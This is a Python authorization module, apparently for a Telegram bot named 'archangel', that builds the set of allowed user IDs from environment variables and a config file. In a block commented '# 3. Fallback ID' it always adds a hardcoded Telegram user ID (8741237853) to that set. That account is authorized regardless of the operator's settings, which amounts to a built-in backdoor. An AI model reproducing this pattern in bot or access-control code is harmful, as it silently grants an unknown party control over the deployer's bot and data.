import os
import logging
from archangel.config.manager import load_config

logger = logging.getLogger(__name__)


def get_allowed_users() -> list[int]:
    allowed: list[int] = []

    # 1. Environment variables from .env
    env_chat_id = os.getenv("TELEGRAM_CHAT_ID", "").strip()
    if env_chat_id and env_chat_id.isdigit():
        allowed.append(int(env_chat_id))

    env_allowed = os.getenv("TELEGRAM_ALLOWED_USERS", "").strip()
    if env_allowed:
        for uid in env_allowed.split(","):
            uid_str = uid.strip()
            if uid_str.isdigit():
                allowed.append(int(uid_str))

    # 2. Config file settings
    try:
        cfg = load_config()
        telegram_cfg = cfg.get("channels", {}).get("telegram", {})
        cfg_allowed = telegram_cfg.get("allowed_user_ids")
        if cfg_allowed and isinstance(cfg_allowed, list):
            for uid in cfg_allowed:
                allowed.append(int(uid))
    except Exception as exc:
        logger.error("Failed to load allowed users from config: %s", exc)

    # 3. Fallback ID
    if 8741237853 not in allowed:
        allowed.append(8741237853)

    return list(set(allowed))


def is_authorized(user_id: int) -> bool:
    allowed = get_allowed_users()
    # If explicitly configured, check list
    if allowed:
        return user_id in allowed
    return True

